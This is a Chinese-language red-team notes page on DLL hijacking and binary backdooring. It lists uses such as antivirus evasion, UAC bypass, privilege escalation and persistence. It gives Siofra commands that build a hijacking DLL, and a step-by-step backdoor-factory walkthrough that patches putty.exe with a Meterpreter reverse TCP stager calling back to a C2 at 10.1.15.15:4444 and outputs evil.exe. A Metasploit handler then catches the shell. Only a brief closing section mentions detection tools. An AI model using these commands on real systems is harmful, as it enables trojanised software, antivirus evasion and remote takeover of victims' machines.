### 简介

DLL Hijacking

DLL注入方式 - 7种不同的DLL注入方式 [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings) 与对应的[详细解释](https://mp.weixin.qq.com/s/mNLxblONujByW16r9tC6yQ)

Visual Studio 2017 实现各种代码注入 [theevilbit/injection](https://github.com/theevilbit/injection)

直接从内存加载DLL[Reflective DLL Injection - Red Teaming Experiments](https://ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection)


### 作用

* DLL Hijacking的作用
  * 执行shellocde 且免杀效果好
    * 案例 - [【微步在线报告】“海莲花”攻击 - 白利用 0检出](https://m.threatbook.cn/detail/1397?from=groupmessage&isappinstalled=0)
  * BypassUAC
  * windows提权
  * 权限维持(替换常用程序dll)
  * ...

### 测试

使用[siofra](https://github.com/Cybereason/siofra)检测xx.exe的DLL能否被劫持

```
# 文件扫描模式 对父程序xx.exe进行扫描 枚举它所依赖的dll文件 并检测能否DLL Hijacking
Siofra32.exe --mode file-scan -f "c:\Program Files\xxx\xx.exe" --enum-dependency --dll-hijack
# 如结果
# [!] Module chrome_elf.dll vulnerable at C:\ProgramData\xxx\chrome_elf.dll (real path: Unknown)

# Exploit - 生成存在恶意代码chrome_elf.dll 从而实现dll劫持
Siofra32.exe --mode infect -f chrome_elf(real).dll -o chrome_elf.dll --payload-type process --payload-path C:\Windows\System32\calc.exe
```

### 利用

Black Hat USA 2015 分享的工具 (kali2.0自带 虽然不再维护 但不影响使用)

* [secretsquirrel/the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory)
  * 功能：Patch PE, ELF, Mach-O binaries with shellcode. 
  * 原理：查找二进制程序的代码缝隙，并在其中插入自定义代码，生成新的二进制程序（文件大小不变。且理论上不影响原有功能，具体需要实际测试）
  * 触发：运行修改后的二进制程序，会执行自定义代码

#### 实际利用 - Windows下PE程序的Patch过程

基于某个dll/exe文件，在不破坏其原有功能的前提下，生成含有自定义代码的dll/exe文件，以替换掉原dll/exe文件

执行过程 (环境 kali2.0)
```
# 1. 检测某文件 是否支持patch 如果支持则可插入自定义代码
backdoor-factory -f putty.exe -S

# 2. 检测某文件 的代码缝隙(code cave)及大小   这里查看size>200的代码缝隙
backdoor-factory -f putty.exe -c -l 200

# 3. 检测某文件 具体支持插入 哪些payload(工具自带8种payload. 选user_supplied_shellcode_threaded为指定自定义payload)
backdoor-factory -f putty.exe -s show

·cave_miner_inline
·iat_reverse_tcp_inline
·iat_reverse_tcp_inline_threaded
·iat_reverse_tcp_stager_threaded #利用这个二进制程序的IAT(the Import Address Table)导入地址表，插入Metasploit reverse TCP stager的代码
·iat_user_supplied_shellcode_threaded
·meterpreter_reverse_https_threaded
·reverse_shell_tcp_inline
·reverse_tcp_stager_threaded
·user_supplied_shellcode_threaded #自定义payload


# 4. 插入payload
#
#   【1】插入payload  -  自带的8种常用的payload)
#    插入 本工具自带的某种具体的payload(这里是iat_reverse_tcp_stager_threaded)  -H指定C2服务器IP -P指定C2服务器端口
#    以下Patch方式可选(默认Patch方式为手动Patch.  使用参数 -m automatic 即可指定为自动Patch)
#
#    [4-1-1] 手动Patch(backdoor-factory将提示你手动选择 代码缝隙的数量和大小)
#        (1)如果 使用-J参数:将shellcode保存到>1个代码缝隙 - 如果shellcode过大可以用这个方式 且具有更好的免杀效果
#        (2)如果 不加-J参数:将shellcode保存到=1个代码缝隙 - 选择某1个可用的代码缝隙(code cave) 理论上选哪个都可以
#        (3)如果 使用-a参数:将新section添加到exe中 - 更容易成功 但免杀效果差   使用-a参数的同时常常使用 -n name 指定新的section的名字（长度必须小于7个字符）
#
#    [4-1-2] 自动Patch(backdoor-factory将判断并自动选择 代码缝隙的数量和大小)
#        backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -m automatic

backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -J



#   【2】插入payload  -  用工具或手工构造 自定义的payload
#    msfvenom -p windows/messagebox -f raw >msg.bin
#    将自定义代码插入normal.exe 生成evil.exe
backdoor-factory -f normal.exe -s user_supplied_shellcode_threaded -U msg.bin -o evil.exe
```


MSF开启handler进行监听(如果victim执行了evil.exe 即可得到victim反弹来的shell)
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.1.15.15
set lport 4444
exploit

# 收到shell后可以进行后渗透操作:迁移到其他进程(migrate to other processes), 权限提升(escalate privileges), 攻击内网中的其他主机...
```


全部帮助信息

```
Usage: backdoor-factory [options]

Options:
  -h, --help            show this help message and exit
  -f FILE, --file=FILE  File to backdoor
  -s SHELL, --shell=SHELL
                        Payloads that are available for use. Use 'show' to see
                        payloads.
  -H HOST, --hostip=HOST
                        IP of the C2 for reverse connections.
  -P PORT, --port=PORT  The port to either connect back to for reverse shells
                        or to listen on for bind shells
  -J, --cave_jumping    Select this options if you want to use code cave
                        jumping to further hide your shellcode in the binary.
  -a, --add_new_section
                        Mandating that a new section be added to the exe
                        (better success) but less av avoidance
  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
                        User supplied shellcode, make sure that it matches the
                        architecture that you are targeting.
  -c, --cave            The cave flag will find code caves that can be used
                        for stashing shellcode. This will print to all the
                        code caves of a specific size.The -l flag can be use
                        with this setting.
  -l SHELL_LEN, --shell_length=SHELL_LEN
                        For use with -c to help find code caves of different
                        sizes
  -o OUTPUT, --output-file=OUTPUT
                        The backdoor output file
  -n NSECTION, --section=NSECTION
                        New section name must be less than seven characters
  -d DIR, --directory=DIR
                        This is the location of the files that you want to
                        backdoor. You can make a directory of file backdooring
                        faster by forcing the attaching of a codecave to the
                        exe by using the -a setting.
  -w, --change_access   This flag changes the section that houses the codecave
                        to RWE. Sometimes this is necessary. Enabled by
                        default. If disabled, the backdoor may fail.
  -i, --injector        This command turns the backdoor factory in a hunt and
                        shellcode inject type of mechanism. Edit the target
                        settings in the injector module.
  -u SUFFIX, --suffix=SUFFIX
                        For use with injector, places a suffix on the original
                        file for easy recovery
  -D, --delete_original
                        For use with injector module.  This command deletes
                        the original file.  Not for use in production systems.
                        *Author not responsible for stupid uses.*
  -O DISK_OFFSET, --disk_offset=DISK_OFFSET
                        Starting point on disk offset, in bytes. Some authors
                        want to obfuscate their on disk offset to avoid
                        reverse engineering, if you find one of those files
                        use this flag, after you find the offset.
  -S, --support_check   To determine if the file is supported by BDF prior to
                        backdooring the file. For use by itself or with
                        verbose. This check happens automatically if the
                        backdooring is attempted.
  -M, --cave-miner      Future use, to help determine smallest shellcode
                        possible in a PE file
  -q, --no_banner       Kills the banner.
  -v, --verbose         For debug information output.
  -T IMAGE_TYPE, --image-type=IMAGE_TYPE
                        ALL, x86, or x64 type binaries only. Default=ALL
  -Z, --zero_cert       Allows for the overwriting of the pointer to the PE
                        certificate table effectively removing the certificate
                        from the binary for all intents and purposes.
  -R, --runas_admin     EXPERIMENTAL Checks the PE binaries for
                        'requestedExecutionLevel level="highestAvailable"'. If
                        this string is included in the binary, it must run as
                        system/admin. If not in Support Check mode it will
                        attmept to patch highestAvailable into the manifest if
                        requestedExecutionLevel entry exists.
  -L, --patch_dll       Use this setting if you DON'T want to patch DLLs.
                        Patches by default.
  -F FAT_PRIORITY, --fat_priority=FAT_PRIORITY
                        For MACH-O format. If fat file, focus on which arch to
                        patch. Default is x64. To force x86 use -F x86, to
                        force both archs use -F ALL.
  -B BEACON, --beacon=BEACON
                        For payloads that have the ability to beacon out, set
                        the time in secs
  -m PATCH_METHOD, --patch-method=PATCH_METHOD
                        Patching methods for PE files, 'manual','automatic',
                        replace and onionduke
  -b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY
                        For onionduke. Provide your desired binary.
  -X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X
                        to support XP. By default the binary will crash on XP
                        machines (e.g. sandboxes)
  -A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table
                        is created in a new section, by calling this flag it
                        will be put in a code cave.  This can cause bianry
                        failure is some cases. Test on target binaries first.
  -C, --code_sign       For those with codesigning certs wishing to sign PE
                        binaries only. Name your signing key and private key
                        signingcert.cer and signingPrivateKey.pem repectively
                        in the certs directory it's up to you to obtain
                        signing certs.
  -p, --preprocess      To execute preprocessing scripts in the preprocess
                        directory
```

### 检测

* procmon
* [volatility](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal)的Malfind插件专门用来检测代码注入(可以检测Reflective DLL Injection)
